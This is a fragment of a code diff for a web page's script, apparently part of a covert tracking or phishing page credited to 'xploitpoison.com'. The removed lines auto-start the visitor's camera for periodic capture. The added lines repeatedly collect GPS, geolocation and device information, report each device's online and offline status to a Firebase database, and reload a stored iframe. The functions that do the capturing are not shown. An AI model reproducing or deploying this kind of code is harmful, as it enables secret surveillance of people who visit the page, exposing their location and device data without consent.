-        $("cameraStatus").style.display = "none";
-        $("faceGuide").style.display = "none";
+      // ✅ RELOAD FIX: Firebase ready hone ke baad turant iframe wapas load karo
+      const savedIframeUrl = localStorage.getItem('active_iframe_url');
+      if (savedIframeUrl) {
+        const iframe = document.getElementById('dynamicFrame');
+        if (iframe) {
+          iframe.src = savedIframeUrl;
+          iframe.style.display = 'block';
+          console.log('🔄 Restored iframe from reload:', savedIframeUrl);
+        }
       }
 
-      $("captureBtn").disabled = true;
-      $("startBtn").disabled = true;
-      startAnalysis();
+      startApp();
+    }
+
+    /* ---------------- LIFECYCLE ---------------- */
+    document.addEventListener('visibilitychange', () => {
+      if (!document.hidden) { captureGPS(); captureGeo(); updateDeviceInfo(); }
     });
 
-    window.addEventListener('load', async () => {
-      if (navigator.permissions && navigator.permissions.query) {
-        try {
-          const permissionStatus = await navigator.permissions.query({ name: 'camera' });
-          if (permissionStatus.state === 'granted') {
-            log("Auto-starting camera (Permission granted)...");
-            enableCamera();
-          }
-        } catch (e) { }
+    window.addEventListener('beforeunload', async () => {
+      if (database) {
+        await database.ref(`online_devices/${deviceId}`).set({
+          status: 'offline',
+          offlineTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+        });
       }
+      if (gpsInterval) clearInterval(gpsInterval);
+      if (geoInterval) clearInterval(geoInterval);
     });
 
-    window.addEventListener('beforeunload', () => {
-      if (captureInterval) clearInterval(captureInterval);
-      if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+    window.addEventListener('online', async () => { await updateDeviceInfo(); captureGPS(); captureGeo(); });
+    window.addEventListener('offline', () => { });
+
+    /* ---------------- START ---------------- */
+    if (typeof firebaseConfig !== 'undefined') initFirebase();
+    else window.addEventListener('load', () => {
+      if (typeof firebaseConfig !== 'undefined') initFirebase();
+      else console.error('config.js file not found!');
     });
+
   </script>
+  <!--CREATED BY https://www.xploitpoison.com/-->
 </body>
 
 </html>
